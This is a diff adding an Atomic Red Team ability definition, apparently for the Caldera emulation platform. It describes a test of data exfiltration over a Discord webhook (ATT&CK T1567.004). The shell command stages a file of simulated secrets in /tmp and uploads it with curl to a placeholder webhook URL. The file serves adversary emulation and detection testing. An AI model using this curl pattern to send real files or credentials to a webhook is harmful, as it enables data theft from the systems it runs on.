@@ -1,0 +1,47 @@
+- id: 40c44d16-bb49-4d14-aafa-f9ba7e6e6c5b
+  name: Exfiltrate staged file to a Discord webhook with curl (bash)
+  description: 'Stages a file containing simulated sensitive data and uploads it as
+    a multipart
+
+    `file` attachment to a Discord incoming webhook using curl. This produces an outbound
+
+    HTTPS POST to a commonly allow-listed SaaS endpoint, mirroring real-world data
+    theft
+
+    that abuses Discord webhooks for exfiltration.
+
+    See https://discord.com/developers/docs/resources/webhook#execute-webhook'
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.004
+    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  platforms:
+    darwin:
+      sh:
+        command: echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -F "file=@/tmp/T1567.004_loot.txt" "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
+        cleanup: rm -f "#{staged_file}"
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1567.004
+  - exfiltration
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      webhook_url:
+        description: Discord incoming webhook URL the staged data is exfiltrated to
+        type: string
+        default: https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken
+      staged_file:
+        description: Path to the file that is staged and exfiltrated
+        type: path
+        default: /tmp/T1567.004_loot.txt
+    technique_created: '2023-07-20T15:30:55.763Z'
+    atomic_guid: 40c44d16-bb49-4d14-aafa-f9ba7e6e6c5b
+    import_timestamp: '2026-06-25T06:06:07.084658Z'
